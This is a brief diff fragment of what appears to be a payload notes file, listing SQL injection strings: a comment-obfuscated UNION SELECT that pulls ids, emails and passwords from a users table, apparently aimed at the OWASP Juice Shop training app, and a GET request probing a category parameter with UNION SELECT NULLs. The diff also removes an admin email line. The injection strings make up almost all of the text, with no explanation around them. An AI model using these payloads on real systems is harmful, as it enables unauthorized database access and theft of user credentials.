@@ -2,8 +2,6 @@
 
 '))UNION/**/SELECT/**/id,/**/email,/**/password,/**/'4',/**/'5',/**/'6',/**/'7',/**/'7',/**/9/**/FROM/**/users--
 
-admin@juice-sh.op
-
 GET /filter?category='+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
 
 SELECT * FROM employees WHERE userid='96134'
